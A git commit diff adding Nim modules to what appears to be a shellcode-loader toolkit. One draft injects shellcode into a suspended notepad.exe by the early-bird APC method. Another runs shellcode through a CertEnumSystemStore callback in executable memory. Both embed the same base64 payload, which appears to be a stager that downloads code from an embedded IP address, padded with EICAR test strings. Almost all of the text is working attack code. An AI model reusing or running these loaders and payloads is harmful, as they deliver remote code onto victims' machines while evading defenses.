93a976b1962ba0fbc547064db80d64072349af9b
ar33zy <ar33zyboi@gmail.com>
2022-08-26 15:59:35 +0800

    Added new modules: CertEnumSystemStore CryptEnumIODInfo EarlyBirdAPCQueue EnumCalendarInfo EnumDesktopWindow EnumDIsplayMonitors EnumLanguageGroupLocales EnumSystemGeoID EnumTimeFormats

--- drafts/parked_earlybird_apcqueue.nim
+++ drafts/parked_earlybird_apcqueue.nim
@@ -3,18 +3,42 @@ import base64
 import winim
 import winim/lean
 
-proc enumTimeFormats[byte](shellcode: openArray[byte]): void =
-  
-  let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
-  copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
+proc earlybirdApcQueue[byte](shellcode: openArray[byte]): void =
+  var
+      si: STARTUPINFOEX
+      pi: PROCESS_INFORMATION
+      ps: SECURITY_ATTRIBUTES
+      ts: SECURITY_ATTRIBUTES
+      res: WINBOOL
+      pHandle: HANDLE
+      tHandle: HANDLE
 
-  EnumTimeFormatsEx(
-    cast [TIMEFMT_ENUMPROCEX](rPtr),
-    LOCALE_NAME_SYSTEM_DEFAULT,
-    TIME_NOSECONDS,
-    cast[LPARAM](nil)
+  res = CreateProcess(
+      NULL,
+      newWideCString(r"notepad.exe"),
+      ps,
+      ts, 
+      TRUE,
+      CREATE_SUSPENDED,
+      NULL,
+      NULL,
+      addr si.StartupInfo,
+      addr pi
   )
 
+  pHandle = pi.hProcess
+  tHandle = pi.hThread
+
+  let rPtr = VirtualAllocEx(pHandle, nil, cast[DWORD](shellcode.len), MEM_COMMIT, PAGE_READWRITE)
+  let apcRoutine = cast[PTHREAD_START_ROUTINE](rPtr);
+
+  var bytesWritten: SIZE_T
+
+  let test = WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
+  QueueUserAPC(cast[PAPCFUNC](cast[PTHREAD_START_ROUTINE](rPtr)), tHandle, cast[ULONG_PTR](nil))
+  ResumeThread(tHandle)
+
+  
 when isMainModule:
   func toByteSeq*(str: string): seq[byte] {.inline.} =
     @(str.toOpenArrayByte(0, str.high))
@@ -22,4 +46,4 @@ when isMainModule:
   let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8vdlBMSwA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy4wLjA0NTA2LjMwKQ0KADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSQBBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTQ1AAAAAAA=" 
 
   let shellcode = toByteSeq(decode(enc))
-  enumTimeFormats(shellcode)
+  earlybirdApcQueue(shellcode)
--- modules/cert_enum_system_store.nim
+++ modules/cert_enum_system_store.nim
@@ -3,18 +3,18 @@ import base64
 import winim
 import winim/lean
 
-proc enumTimeFormats[byte](shellcode: openArray[byte]): void =
+proc certEnumSystemStore[byte](shellcode: openArray[byte]): void =
   
   let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
   copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
-
-  EnumTimeFormatsEx(
-    cast [TIMEFMT_ENUMPROCEX](rPtr),
-    LOCALE_NAME_SYSTEM_DEFAULT,
-    TIME_NOSECONDS,
-    cast[LPARAM](nil)
-  )
-
+  
+  CertEnumSystemStore(
+    CERT_SYSTEM_STORE_CURRENT_USER,
+    NULL,
+    NULL,
+    cast[PFN_CERT_ENUM_SYSTEM_STORE](rPtr),
+  )   
+ 
 when isMainModule:
   func toByteSeq*(str: string): seq[byte] {.inline.} =
     @(str.toOpenArrayByte(0, str.high))
@@ -22,4 +22,4 @@ when isMainModule:
   let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8vdlBMSwA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy4wLjA0NTA2LjMwKQ0KADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSQBBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTQ1AAAAAAA=" 
 
   let shellcode = toByteSeq(decode(enc))
-  enumTimeFormats(shellcode)
+  certEnumSystemStore(shellcode)
